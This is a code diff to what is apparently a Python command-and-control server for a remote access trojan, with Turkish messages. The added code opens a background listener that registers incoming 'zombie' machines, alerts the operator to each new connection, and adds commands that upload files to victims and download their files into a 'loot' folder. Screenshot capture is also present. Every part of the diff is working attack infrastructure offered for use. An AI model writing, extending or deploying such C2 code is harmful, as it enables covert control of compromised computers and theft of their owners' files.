@@ -496,6 +496,39 @@ except:
 active_sessions = {}
 session_counter = 1
 
+def start_listener_background(port):
+    global active_sessions, session_counter
+    aes_key = None
+    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller/Sistem/c2_aes_key.txt")
+    if os.path.exists(key_path):
+        with open(key_path, "r") as f:
+            aes_key = f.read().strip().encode('utf-8')
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("0.0.0.0", int(port)))
+    s.listen(100)
+
+    def accept_thread():
+        global session_counter, active_sessions
+        while True:
+            try:
+                conn, addr = s.accept()
+                conn.settimeout(None)
+                sid = session_counter
+                session_counter += 1
+                active_sessions[sid] = {"conn": conn, "addr": addr, "key": aes_key}
+                try:
+                    import Moduller.Sistem.Bildirim_Sistemi
+                    Moduller.Sistem.Bildirim_Sistemi.send_alert(f"YENI ZOMBI: {addr[0]}:{addr[1]} (ID: {sid})", title="C2 BAGLANTISI")
+                except: pass
+            except:
+                break
+                
+    t = threading.Thread(target=accept_thread, daemon=True)
+    t.start()
+    return True
+
 def c2_listener():
     global active_sessions, session_counter
     clear_screen()
@@ -635,6 +668,16 @@ def interact_with_session(sid):
                 
             if not cmd.strip(): continue
             
+            if cmd.startswith("!upload "):
+                filename = cmd[8:].strip()
+                if not os.path.exists(filename):
+                    print(f"{C.RED}[-] Dosya bulunamadi: {filename}{C.RESET}")
+                    continue
+                import base64
+                with open(filename, "rb") as f:
+                    b64_data = base64.b64encode(f.read()).decode()
+                cmd = f"!upload {os.path.basename(filename)} {b64_data}"
+            
             resp = send_and_recv(conn, cmd, aes_key)
             if resp is None:
                 print(f"{C.RED}[-] Zombi ile bağlantı koptu!{C.RESET}")
@@ -642,7 +685,17 @@ def interact_with_session(sid):
                 del active_sessions[sid]
                 break
                 
-            if cmd == "!screenshot":
+            if cmd.startswith("!download ") and resp.startswith("!DOWNLOAD_START!"):
+                try:
+                    import base64
+                    b64_data = resp.replace("!DOWNLOAD_START!", "")
+                    down_path = os.path.join("Ganimetler", f"down_{sid}_{os.path.basename(cmd[10:].strip())}")
+                    with open(down_path, "wb") as f:
+                        f.write(base64.b64decode(b64_data))
+                    print(f"{C.GREEN}[+] Dosya indirildi: {down_path}{C.RESET}")
+                except:
+                    print(f"{C.RED}[-] Dosya indirme hatasi.{C.RESET}")
+            elif cmd == "!screenshot":
                 try:
                     import base64
                     img_data = base64.b64decode(resp)
